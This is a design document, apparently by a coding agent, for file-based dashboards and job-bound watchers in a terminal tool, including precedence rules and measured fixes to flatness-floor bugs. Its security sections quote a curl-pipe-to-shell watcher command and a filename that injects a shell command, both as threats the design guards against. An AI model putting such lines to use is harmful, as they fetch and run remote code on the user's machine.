# R56 — dashboards and watchers as FILES

Status: **DESIGN — not built.** Shown for review before any code, per the operator's
instruction. Everything below marked MEASURED was measured on this box on the day of writing.

The correction this answers, verbatim: *"i still dont see the watchers directory and/or they still
dont belong to jobs. Also not visible - dashboards directory. everything is half done."*

The three defects that make "half done" the right word:

1. **Nothing can reach the machinery.** `grep` for anything named watcher or dashboard finds exactly
   one file, `src/dash.lisp`. There is no `watchers/`, no `dashboards/`. `dash-register-defaults`
   (`src/dash.lisp:1310-1411`) hardcodes this head's panels in this head's SOURCE, so a new
   dashboard is an edit to leticl or a live `dash-register` that dies with the image.
2. **A watcher cannot belong to a job.** The job tie exists only as `:job` on a *panel*, matched by
   `dash-panel-for-job`, fed from the job's OUTPUT window. `*dash-samplers*` has no job notion at
   all: a sampler is global and runs whenever the collector runs.
3. **The collector only runs while the pane is open** (`commands.lisp:361`, `/dashboards` calls
   `dash-start`). A watcher for a job that ran 09:00–11:00 and a pane opened at 10:55 has five
   minutes of history and no way to answer *how fast did it go*.

And, measured while designing this, **a defect in the flatness work itself** — see §7.

---

## 1. The two directories, and precedence

> **RULED by the operator: shape (a).** Two directories, workspace beats user. And `lisp` is dropped
> from the source kinds — §2 and §2a carry the consequences.

```
${XDG_CONFIG_HOME:-~/.config}/letibot/watchers/*.json      the shared, user-level directory
${XDG_CONFIG_HOME:-~/.config}/letibot/dashboards/*.json

<workspace>/.letibot/watchers/*.json                       the project's own
<workspace>/.letibot/dashboards/*.json
```

`<workspace>` is `(getf (session-wiring s) :workspace)` — the head already knows it
(`src/editor.lisp:545`, `src/panes.lisp:341`).

**Precedence: union by `name`; on a collision the workspace file wins.** Not "the workspace
directory replaces the user one" — a project adds one dashboard without having to restate the rest.
This is the same shape as `modes.tsv`'s longest-matching-ancestor rule, one level of mechanism down.

### This is a NEW rule, and the briefing's premise about it is wrong

The briefing says *"`head.toml` already has a precedence story; follow its shape — a workspace
directory beating the user one."* MEASURED, there is no such story anywhere, in either head:

- `~/.config/letibot/head.toml` is ONE flat file. `grep` for `project` or `workspace` in it: no
  hits. It has no per-project sections.
- letibot's `crates/tui/src/prefs.rs` has one `pub fn path()` — user-level, single. There is no
  per-workspace config in either head.
- The tree's actual precedent for "which project is this" is **one user-level file KEYED BY PROJECT
  ROOT**, not a second directory: `modes.tsv`'s own header says *"One row per project root … The
  longest matching ancestor wins."*

So there are two coherent designs and this needs the operator's word:

- **(a) two directories, workspace beats user** — what is written above. The agent in the other
  project writes `.letibot/dashboards/import.json` **inside its own checkout**, which is the
  operator's actual use case: a dashboard for a project's import is a thing that project ships, and
  the agent never has to reach into `~/.config`.
- **(b) one user-level directory, `"project": "<root>"` per file**, longest matching ancestor wins,
  no `project` = global — the `modes.tsv` shape. One mechanism, matches the precedent, and it can
  draw project B's dashboard while the head is in project A.

**Recommendation: (a).** (b)'s only advantage is cross-project visibility while a head is elsewhere,
and (a) is what makes the operator's sentence come true. But (a) is a new rule and that should be a
decision, not an assumption.

Trust note that goes with (a), stated because it is the reason a person may prefer (b): a file in
the workspace directory may have arrived with a clone. It is data, and it is read with `*read-eval*`
nil, so it cannot execute anything by itself — but a `lisp` source (§2) inside it is a form the head
evaluates, so a cloned repo could carry one. (b) would put every such file behind the operator's own
`~/.config`. If (a) is chosen, the honest mitigation is that the pane shows a `lisp`-sourced watcher
with a mark, so the one dangerous field is never invisible.

---

## 2. The watcher file

A watcher PRODUCES series. One file per watcher; the file stem is the default `name`.

```json
{
  "format": 1,
  "name": "import",
  "title": "stripe import",

  "watch": ["import_long_running.py", "job-3f2a9c"],

  "source": { "command": "/home/dead/Projects/import/bin/stats", "timeout": 3 },
  "interval": 5,

  "series": [
    { "name": "rows",    "unit": "rows",   "label": "rows written" },
    { "name": "bytes",   "unit": "B",      "label": "read" },
    { "name": "pending", "unit": "",       "label": "batches queued" },
    { "name": "rate",    "unit": "rows/s", "label": "rate", "floor": 0.5 }
  ]
}
```

Every produced series is named `<watcher name>.<key>`, so this file produces `import.rows`,
`import.bytes`, `import.pending`, `import.rate`. `dash-command-add` already prefixes this way; the
rule is kept.

### `watch` — the job binding, and it is the same match rule

A string, or an array of strings. The match is `dash-job-matches-p` exactly as it is
(`src/dash.lisp:585`): a **substring of the job's COMMAND, or the exact `:id`, case-insensitive**. No
second spelling of that rule — `dash-job-matches-p` is already the one place for it, and the pane and
the feed ask it in both directions.

- `watch` present → the watcher is **job-bound**: it starts when a job it claims is reported, and
  stops when that job settles.
- `watch` absent → **always-on**: the shape of the shipped `system` and `llama` samplers. It runs
  whenever the collector runs.

The rule is right for the reason it was already right: a job's id is known the moment the daemon
reports it, but the file is written BEFORE the job exists, so the association is made on the thing
both sides have — the command line.

### `source` — exactly one of THREE

**`lisp` was dropped by the operator's ruling, and `parse`'s function-name form goes with it** — a
symbol named by a file and `funcall`ed is the same hole one size smaller. `"parse"` is a closed
two-name enumeration, `"pairs"` (default, `dash-parse-pairs` — `key value` and `key=value`) and
`"json"`, the same discipline as `format` in §3.

| kind | shape | what it DOES |
|---|---|---|
| `command` | `{"command": "…", "timeout": 3}` | **RUNS** `/bin/sh -c` under coreutils `timeout`. Covers `curl`, `docker exec`, the operator's other mount namespace, anything that can print. |
| `file` | `{"file": "/path"}` | **READS**, and therefore does NOT go through a shell. See below. |
| `job_output` | `{"job_output": true}` | **READS** the daemon's own output window for the claimed job, parsed with `dash-parse-pairs`. Needs `watch`. No process. |

**`file` is `argv`, not `sh -c`, and this is a defect in the first cut of this doc.** It was written
as *"sugar for `cat -- /path`, same timeout"* — which, because `command` runs through `/bin/sh -c`,
would have made a PATH a mini-program: a file named `x; curl … | sh` is a command, not a filename.
Run as argv (`timeout N cat -- PATH`, no shell anywhere in the path), a path is only a path, and
there is nothing to quote and nothing to inject. The timeout stays, because a hung NFS mount must
not wedge the collector thread.

The three kinds now sort into two acts, and that distinction is the whole of §2a: **`command` runs;
the other two read.**

`"timeout"` defaults to 10 and is **not** decorative: `uiop:run-program`'s `:timeout` was measured
to do nothing, so the cap is coreutils' `timeout` in front of the shell (`dash-command-add`'s
docstring records the 30-second wedge that found this).

### §2a. Which watchers may RUN — the operator's question

Dropping `lisp` removed the field that *looked* dangerous and left the one that is:
`{"command": "curl https://…/x.sh | sh"}` in a cloned checkout executes more directly and with less
ceremony than the `lisp` form ever did. So the question is not which field is dangerous. It is:
**may a watcher that arrived in a workspace execute at all, and if so what makes that a decision
rather than a default?**

**The rule, and it is two clauses.**

1. **A USER-level watcher may use any of the three kinds, with no gate.** `~/.config/letibot/` is
   the operator's own directory, behind their own hand — the same standing as `head.toml`, which
   they edit without a card. Asking them to approve a line they typed is ceremony.
2. **A WORKSPACE watcher may READ freely and may RUN only with a person's approval of that exact
   command.** READ means `job_output`, and `file` with a path **inside the workspace**. RUN means
   `command`: the first time a workspace watcher wants to run, it draws a card naming the FILE and
   the COMMAND verbatim, and approval is remembered **keyed on the command text**, so editing the
   command re-asks. A head nobody is watching skips the watcher and says so — §5's rule that no file
   can stop the head, applied to the one field that could.

**Why not asymmetric kinds — workspace watchers may only read.** It is the tidiest of the three and
it BREAKS the operator's own measured case. `dash-command-add`'s docstring records the measurement:
the long-running import runs in a different mount namespace, `nsenter` answers `Operation not
permitted`, and **its state is on a path that does not exist in the head's filesystem**. So neither
`file` nor `job_output` can reach it; only `command` (`docker exec …`, or whatever crosses that
boundary) can. Forbidding running in workspace files would forbid exactly the dashboard the operator
asked for. So the answer cannot be *workspace files never run*; it has to be *running is a decision*.

**Why not trust the checkout.** The argument is coherent for a build system, and the head is not the
build system. `cargo build` running `build.rs` is a thing the operator invoked, in the project, to
build the project, and they are watching it. The head runs a watcher **on a timer, unattended, in
the background, while they are doing something else**. An unattended timer is the worst place to
accept authority on the strength of *"it is in a directory I am in"* — and the concrete difference
is that `cd`-ing into a fresh clone to look at it is an ordinary thing to do. `cat`-ing a state file
and running a shell command are not the same act even in a repo you trust.

**The cost, stated rather than hidden:** one card, once per command; and the head needs a small
approval store of its own. It cannot be `~/.config/letibot/permission.json` — that file is the
daemon's, its format is letibot's, and its subject is the *agent's tool calls*, adjudicated over the
wire. A watcher is the HEAD's own timer, so the record is the head's:
`~/.config/leticl/watcher-approvals.json`, `{"command text": {"file": …, "at": ms}}`, written only
on an explicit yes.

**And the pane says which is which.** Every watcher is listed with `read` / `run` / `run ✓approved` /
`run · waiting for approval`, so the one dangerous field is never invisible. That was the right
instinct pointed at the wrong field.

### `series` — the units, and this is the load-bearing field

Applied with `dash-series-new` **before the first sample**, not on the first one. Two reasons, and
the first is a live bug:

1. `dash-floor-for` reads the unit off the series to pick the flatness floor. Today **no series in a
   running head has a unit at all** — §7 — so the per-unit floor table is dead and every series is
   judged with the 1.0 default. Declaring the unit is what makes the table reachable.
2. The series exists from load time, so a dashboard's freshness chip can say *no data yet* rather
   than a panel being unable to tell "no such series" from "no samples yet".

- `unit`: the floor key. `"B"`, `"bytes"`, `"%"`, `"percent"`, `"s"`, `"ms"` are the table;
  anything else gets the 1.0 default. `"rows"` and `"rows/s"` deliberately land there.
- `floor`: optional absolute floor, overriding the unit's. Refused (falls back to the unit's) unless
  it is a positive number. This does override R56's *"PER UNIT AND NOT PER SERIES"* — argued in §8.
- `label`: optional display name. The watcher names the number; the DASHBOARD says where it goes.

**A key the source emits but the file did not declare is still recorded.** A declaration is a claim
about units and drawing, never a filter — a filter would silently drop the one number the operator
needed, which is the worst failure this feature could have.

**A dashboard may declare units too**, with the same `series` field, for series it did not produce
(the `job.<id>.produced` counters, most importantly — they are byte totals and today they get floor
1.0). Same field, same shape, one rule.

---

## 3. The dashboard file

A dashboard DRAWS. `dash-register`'s own argument list is the honest starting list —
`(name &key title rows order needs job feed)` — and each one has a home below.

```json
{
  "format": 1,
  "name": "import",
  "title": "stripe import",
  "order": 20,
  "watch": "import_long_running.py",

  "series": [
    { "name": "import.bytes",         "unit": "B" },
    { "name": "import.rate",          "unit": "rows/s", "floor": 0.5 }
  ],

  "rows": [
    { "label": "state",   "job": "state" },
    { "label": "rows",    "series": "import.rows", "format": "number",
      "bar": { "of": 41200000 }, "tail": "of 41.2M rows",
      "flatness": "crit" },
    { "label": "read",    "series": "import.bytes", "format": "bytes",
      "bar": { "of": "import.bytes_total" }, "tail": "of the 32 GiB dump" },
    { "label": "rate",    "series": "import.rate", "format": "rate",
      "spark": true, "kind": "dim", "tail": "{unit}" },
    { "label": "pending", "series": "import.pending", "format": "number",
      "kind": "pending", "tail": "batches queued" },
    { "label": "dropped", "job": "dropped", "format": "bytes",
      "kind": "warn", "tail": "output lost off the ring" }
  ]
}
```

### Top level

| key | `dash-register` | notes |
|---|---|---|
| `name` | `name` | default: the file stem. A collision shadows: workspace over user. |
| `title` | `title` | default `name`. |
| `order` | `order` | default 50; `dash-register`'s stable sort already keeps a replaced panel's place. |
| `needs` | `needs` | the freshness chip's series. Default: every series the rows name. |
| `watch` | `job` | the job this panel is about — the SAME match rule. Makes the three `job` rows below available, and makes the panel's life the job's. |
| `enabled` | — | `false` silences this panel. **Load-bearing**: it is the only way a workspace file can suppress a user-level panel it is shadowing without deleting the operator's file. |
| `series` | — | unit declarations, §2. |
| `rows` | `rows` | below. |

### A row

| key | renderer field | notes |
|---|---|---|
| `label` | `:label` | the left column |
| `series` | `:value` | which number. Absent → the row is words only |
| `job` | — | `"state"`, `"produced"`, `"dropped"` — the three things every job-backed panel can say with NO watcher file at all. `state` draws one of R56's five states. |
| `format` | `:value` | `number` `bytes` `rate` `percent` `duration` `ago` `fixed` (+ `"digits": 1`). **Named, not a format string** — a `format` string in a data file is Lisp's `format` with extra steps, and it is how a data format becomes a programming language. Each name maps to a function the head already has (`dash-bytes`, `dash-rate`, `dash-pct`, `dash-direction`). |
| `bar` | `:bar` | `{"of": NUMBER}` for a constant maximum, `{"of": "series"}` when the maximum is itself a series, `true` when the series is already 0..1, `{"segments": [{"of": …, "kind": …}]}` for the segmented bar, absent for none |
| `spark` | `:spark` | `true` (this row's own series) or a series name |
| `tail` | `:tail` | a literal, or a `{slot}` template. Slots: `{value} {unit} {peak} {min} {mean} {change} {direction} {age}`, **plus `{pct}` (this row's own bar fraction)** and two prefixed lookups, `{series:NAME}` and `{pct:NAME}` — resolved from the row's series. Justification: the shipped llama panel's tail is `"peak 114.4 tok/s  falling"`, and the renderer's `:tail` is documented as *"the DENOMINATOR — the unit, the ratio, or the sentence that keeps the value honest"*. A literal cannot say that sentence, and the shipped system panel's `of 251.6G · 34%` needs ANOTHER SERIES — so `{series:NAME}` is what lets a file say what a built-in already says. **`{pct}` and not `{pct:NAME}` is the ratio**: MEASURED, `{pct:sys.mem_total}` renders the denominator as a percentage of itself (409600%). An unknown slot is LEFT STANDING, so a typo is visible rather than silently nothing. |
| `kind` | `:kind` | `plain dim good warn crit pending` |
| `flatness` | — | `"tail"` draws the plateau sentence when there is one; `"warn"` / `"crit"` also set the row's kind then. **This is the door for the work already built**: without it `dash-flatness` is reachable only from Lisp. It carries R56's rule — `dash-flatness-said` returns NIL when the panel has something actionable to say, and the row's own `tail` wins. |

### The minimum an agent in another project must write

ONE file, with `watch` and a couple of `job` rows, and no watcher file at all:

```json
{ "format": 1, "name": "import", "title": "stripe import",
  "watch": "import_long_running.py",
  "rows": [ { "label": "state", "job": "state" },
            { "label": "written", "job": "produced", "format": "bytes" } ] }
```

That is reachable with nothing new but the file reader, and it is the sentence the operator said
this head exists for.

---

## 4. The job binding as a lifecycle

The wire facts, already verified and unchanged: **a job STARTING is announced by exactly one event
— `:tool-finished` with `outcome-name` `"backgrounded"`; there is no `JobStarted` on the wire** — and
`:job-settled` arrives unprompted from the daemon's watcher thread. The head then asks
(`make-list-jobs` → `head-jobs`), which `head.lisp:839` already does for the status line's count.

| state | trigger | what happens | built? |
|---|---|---|---|
| **found** | head start; `/dashboards` open; a `/dash-reload`; the collector's tick when a directory or file mtime moved | each file parsed in isolation, panels registered, `series` units declared, watchers catalogued | no |
| **claimed** | a job appears in `head-jobs` and a watcher's `watch` matches it (`dash-job-matches-p`) | every matching watcher starts — two watchers may claim one job legitimately, they watch different things. An exact `:id` match wins over a substring. | partly (`tick-dash-feeds` already asks for the list while a panel is unmatched) |
| **started** | claim | the watcher's sampler is registered and the collector is started **whether or not a pane is open** | no |
| **stopped** | the job's state is settled (`exited 0`, `ended`, `never_ran`) | the sampler is stopped, not unregistered | no |
| **survives** | — | the series history in `*dash-series*`, untouched by the stop; the panel keeps drawing it with a staleness chip; the settling job's own word (`ended`, never `error`) stays in its `state` row | partly |

Two decisions inside that table, stated because they change behaviour:

- **The collector's run condition becomes `(or pane-open (a job-bound watcher is active))`.** The
  operator's case is an import that runs for hours; a dashboard whose history starts when somebody
  happens to look answers none of the questions it exists for. Writing the file IS asking for the
  collection, so this is not work nobody requested — the objection `dash-register-defaults` raises
  against sampling for a pane nobody opened.
- **A dashboard existing does not open a pane.** The files make panels *registered* — `/dashboards`
  shows them with nothing typed — but the operator still opens the pane. A pane that opened itself
  would be a worse surprise than an empty one.

**Open, and not answered here: history across a head restart.** "What it collected does not
evaporate" is satisfied against the watcher stopping and the pane closing — the series live in
`*dash-series*`, which is independent of both. It is NOT satisfied against a restart, and on-disk
history is a separate commitment (a sample log format, its truncation, its replay). My
recommendation for the first cut: in-memory, because `produced` is a monotonic ABSOLUTE — a
restarted head refills the primary series from one sample rather than from a delta chain. A rate
series needs two. If the operator wants restart-durable history that is a new row, not a field.

---

## 5. What a head does with a file it cannot understand

**The rule: no file in these directories can stop the head from starting, and no file can stop
another file from working.** A directory a person edits by hand contains a broken file eventually,
and refusal-to-start is the wrong answer to every one of these:

| the file | the head |
|---|---|
| is not valid JSON | records it as broken **with the parser's message and the line**, skips it, and draws one `!` line in `/dashboards` per broken file. Nothing else is affected. |
| says `"format": 2` and this head reads 1 | same, with a message that says exactly that: *"import.json is written for format 2; this head reads 1"*. **Never rewritten, never deleted, never guessed at.** |
| carries a key this head does not know | **ignored, not an error.** The difference from the row above is deliberate: a version bump is the author saying "this is not the old format"; an unknown key within a known version is additive, and a head that renders what it can is more useful than one that refuses a file it mostly understands. |
| names a command or file that does not exist | **not a load error at all.** It is a runtime fact: the sampler fails, records nothing, `*dash-last-error*` already carries it, and the row draws it with `:kind :warn`. `dash-collect-once` is already built this way — a failing sampler is recorded and does not take the other panels' history with it. |
| has a `watch` no job matches | not an error: the panel draws `waiting`, state 1 of R56's five. A panel registered before its job exists is the normal case, not a fault. |
| draws a series nobody produces | not an error: the row draws `—` and the freshness chip says so. |
| collides on `name` with another file in the SAME directory | deterministic and reported: the lexicographically later filename wins and the pane names the collision. Workspace-over-user is the intended shadow; same-directory is a mistake that should be visible, not fatal. |
| has no `rows` | an empty panel, drawn as one. |
| does not exist at all | a head with neither directory must start normally, showing its built-ins. |

The one thing that must also exist: **the built-ins stay built-in.** A fresh head with no config
directory still shows its llama and system panels — `dash-register-defaults` is the default set and
files shadow it by name, exactly as `dash-register` replaces by name. The same panels ship in
`examples/dashboards/` so they can be copied and edited, and a file always wins.

---

## 6. Format: JSON, and why not TOML

MEASURED, in order of weight:

1. leticl already has a real JSON parser and depends on it: `yason` (`leticl.asd:15`),
   `json-decode` / `json-encode-to-string` (`src/json.lisp`). No new dependency, no parser to write.
2. letibot parses JSON with serde, so **both heads can read the same dashboard** — which is the
   property that makes this DATA rather than Lisp.
3. `~/.config/letibot/` already holds `permission.json` and `sensitive.json`. JSON is not a foreign
   body in that directory.
4. leticl's TOML reader is the *"flat `key = "value"` subset"* (`src/prefs.lisp:9`) — **no nesting**.
   A watcher's `series` list and a dashboard's `rows` list are nested, so TOML would mean writing
   and testing a nested-table parser first.
5. Every agent writes JSON. No agent needs Common Lisp, and no agent needs leticl's TOML subset.

The cost, stated: **JSON has no comments**, and these are files a person edits by hand. The
mitigation is the unknown-key rule above — a `"_note": "why this floor is 0.5"` key is legal, is
ignored, and is preserved by nothing (the head never writes these files). If comments matter more
than the parser, the alternative is TOML, and it costs a nested parser written and tested in
leticl.

---

## 7. What this exposes: the flatness floors are dead in a running head

Found while designing the `series` field, because that field is exactly what the floors have been
missing. Three defects, all MEASURED, all in the work reported as done:

**(i) Nothing ever sets a unit.** `dash-note`'s `:unit` argument has **no production caller**:

```
grep -rn "dash-note .*:unit" src/*.lisp     → nothing
grep -rn "dash-series-new"  src/*.lisp      → its own definition, and no caller at all
```

Every value-producing path — `dash-collect-once` (`src/dash.lisp:1095`), `dash-note-job` (1231,
1232, 1237) — calls `(dash-note name value)` with no unit. So every series in a running head has
`unit = ""`, `dash-floor-for ""` is the 1.0 default, and `+dash-flat-floor+` is reachable **only
from the test helper `%feed`**, which is the one caller that passes a unit.

**(ii) `"B"` is unreachable even when a unit IS set.** The table's keys are `"B"` and `"%"`;
`dash-floor-for` downcases the unit before `assoc`. MEASURED on the live head (pid 3548303):

```
(:BYTES 1048576.0  :B 1.0  :B-LOWER 1.0  :PCT 5.0  :PERCENT 5.0  :S 30.0  :UNKNOWN 1.0)
```

So the single most likely unit for a byte series — and the one the docs and the tests both use —
silently gets 1.0.

**(iii) The test named for the floor cannot fail.** `a-flat-series-does-not-fire-on-rounding`
feeds a ±1e-7 wobble with `:unit "B"` and asserts flat. Under the default floor of 1.0 that
assertion is still true — 1e-7 is under BOTH floors — so the test passes with and without the
floor, while its own docstring claims the floor is what makes it true. And **no test asserts
`dash-floor-for` at any point** (`grep` for it in `tests/tests.lisp`: nothing).

**Direction of the real failure, measured: the plateau detector UNDER-reports on exactly the series it
was built for.** A byte counter that has genuinely stalled and jitters by ±100 bytes. The 1 MiB
floor calls that FLAT; the 1.0 floor it actually gets calls it MOVING.

```
floor-no-unit 1.0   floor-for-"B" 1.0
a stalled 2 GB byte counter with ±100 byte jitter: flat-when-no-unit NIL, flat-when-unit-"B" NIL
```

**AND THERE IS A FOURTH DEFECT, found by `/dash-reload` once the third was fixed:** declaring a unit
went through `dash-series-new`, which is a CREATE — it replaced the series plist with an empty
vector, so reloading a panel file on a running head threw away the very history the panel exists to
draw, and the freshness chip went to `no data`. MEASURED: three samples became zero.

**FIXED, and each fix is asserted.** (i) `dash-note` keeps the series' declared unit when the caller
does not restate one. (ii) `dash-floor-for` compares both sides case-insensitively. (iii) the test
that could not fail has a companion case where the two floors DISAGREE (a ±100 byte wobble on a 2 GB
counter), and the suite asserts the floor table itself — it never did, which is how a green suite
reported a floor of 1.0 for bytes. (iv) `dash-series-declare` updates the unit and leaves `:v` alone.

The pre-existing case *"a jump inside the recent window is not flat"* also had to change: its jump
was `1000.0 → 5000.0` on a `B` series, a 4 KB move, which was a real move only while the byte floor
was accidentally 1.0. It is now 1000 → 5000000, and a sub-floor 4 KB move on the same series is
asserted flat — the floor working as designed, from both sides.

One more, found the same way: `%dash-slot-value`'s `direction` passed a series NAME to
`dash-direction`, whose first argument is the values VECTOR. That is a hard error (`#\s is not of
type REAL`), not a wrong answer — the failure mode this tree prefers.

---

## 8. What I think is wrong in the briefing, and the decisions I need

1. **The precedence premise is wrong.** *"`head.toml` already has a precedence story"* — measured,
   neither head has any workspace-level config, and the tree's actual precedent (`modes.tsv`) is one
   user-level file keyed by project root. §1 asks the operator to choose (a) or (b) rather than
   inheriting a rule that is not there.
2. **`series` per-series `floor` overrides R56's "PER UNIT AND NOT PER SERIES"** — deliberately.
   That decision was about a *caller* passing 0 in a live call (*"A floor a caller can pass is a
   floor that gets passed 0"*), and it still holds: `dash-floor-for` keeps the unit table as the
   authority, the file override is refused unless it is a positive number, and a person who knows
   their own series' units is the right author of its floor. If the operator disagrees, the field
   goes and units alone decide.
3. **`format` (format strings) and `tail` (templates) are the two places a data format could start
   growing into a language.** Both are bounded enumerations with a fixed slot list, and both exist
   because the shipped built-ins use them. If either grows a conditional, the design has failed and
   a `lisp` escape hatch is the honest answer instead.
4. **`enabled` exists because of shadowing**, not as a convenience: without it a project cannot
   suppress a user-level panel without editing the operator's own file.
5. **On-disk history is NOT in this design** (§4). "What it collected does not evaporate" is
   satisfied against the watcher stopping and the pane closing, not against a restart. Saying so
   rather than implying it is satisfied.
6. **The `watch` match rule stays exactly `dash-job-matches-p`**, including the case-insensitive
   command substring. It is tempting to add globs or regexes now that files can be written by
   strangers; a second matching rule would let the pane's row and the watcher disagree about which
   job is which, which is the failure that function's own docstring exists to prevent.

## 9. Build order (each step usable alone)

1. ~~Read the two directories; register panels from files; report broken files in the pane.~~
   **BUILT** — commit `814909e`, `src/dashfiles.lisp`. This alone gives the operator the dashboards
   directory, one file per dashboard, and the minimum example in §3. Plus `/dash-reload`, the
   per-panel file note in the header, and `enabled: false` for suppression. The two example files
   are in `~/.config/letibot/dashboards/` (`machine.json`, working now; `import.json`, the template
   for the long import).
2. ~~Declare `series` units.~~ **BUILT, and it is what fixed §7's four defects** — the field is part
   of step 1 because a file that declares a unit is the only thing that makes the floor table live.
3. File reload on mtime during the collector tick.
4. Watchers as sources: `command` / `file` / `job_output`, their intervals, and the `watch` claim.
5. The job lifecycle: start on claim, stop on settle, and the collector's run condition.
6. The execution gate for `command` (§2a), and the pane's `read` / `run` / `waiting` marks.
7. Ship the built-ins as `examples/dashboards/` files, so the shipped panels are also the worked
   examples of the format.

**The `watch` field already registers** — `dash-register :job` — so an `import.json` naming a job
that does not exist yet draws `waiting` and one of R56's five states, which is `tick-dash-feeds`'
case and not a stub. What is missing is a watcher that produces the numbers.

## 10. What is NOT built, said plainly

- **Watchers.** No `watchers/` directory is read yet. The directory convention is decided (§1) and
  the format is designed (§2, §2a), but nothing produces a series from a file.
- **The job lifecycle.** `watch` binds a PANEL to a job (the existing, working `:job`), so the panel
  draws the job's own state and totals. The other direction — a job found on disk, its watcher
  started, stopped when it settles, and the collector running because a watcher is active — is §4
  and is not built.
- **The execution gate** (§2a). Until it exists, no file may RUN anything, which is exactly why the
  gate is safe to leave for step 6: the only sources implemented are the ones that read.
- **On-disk history across a restart** (§4).
- **`examples/dashboards/`** (step 7). The two files in the operator's own directory are the working
  examples meanwhile.
